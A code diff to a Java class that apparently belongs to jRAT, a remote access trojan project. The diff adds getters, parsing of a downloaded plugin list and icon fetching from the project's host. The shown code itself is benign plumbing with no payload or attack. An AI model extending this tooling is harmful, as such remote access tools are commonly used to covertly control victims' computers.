@@ -1,14 +1,17 @@
 package pro.jrat.extensions;
 
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
 
 import pro.jrat.Constants;
 import pro.jrat.net.WebRequest;
+import pro.jrat.ui.renderers.table.PluginsTableRenderer;
 
 public class OnlinePlugin {
 
@@ -29,10 +32,36 @@ public class OnlinePlugin {
 	
 	public ImageIcon getIcon() {
 		if (icon == null) {
-			
+			try {
+				icon = new ImageIcon(ImageIO.read(WebRequest.getInputStream(Constants.HOST + "/plugins/" + this.name + "icon.png")));
+			} catch (Exception e) {
+				e.printStackTrace();
+				icon = PluginsTableRenderer.PLUGIN_ICON;
+			}
 		}
 		
 		return icon;
+	}
+
+	public String getVersion() {
+		return version;
+	}
+
+
+	public String getName() {
+		return name;
+	}
+
+	public String getBuiltFor() {
+		return builtFor;
+	}
+
+	public String getDescription() {
+		return description;
+	}
+
+	public String getAuthor() {
+		return author;
 	}
 
 	public static List<OnlinePlugin> getAvailablePlugins() throws Exception {
@@ -42,11 +71,19 @@ public class OnlinePlugin {
 		String line;
 		
 		while ((line = reader.readLine()) != null) {
+			String version = reader.readLine();
+			String builtFor = reader.readLine();
+			String description = reader.readLine();
+			String author = reader.readLine();
+			OnlinePlugin plugin = new OnlinePlugin(line, version, builtFor, description, author);
 			
+			plugins.add(plugin);
 		}
 		
 		
 		reader.close();
+		
+		return plugins;
 	}
 
 }
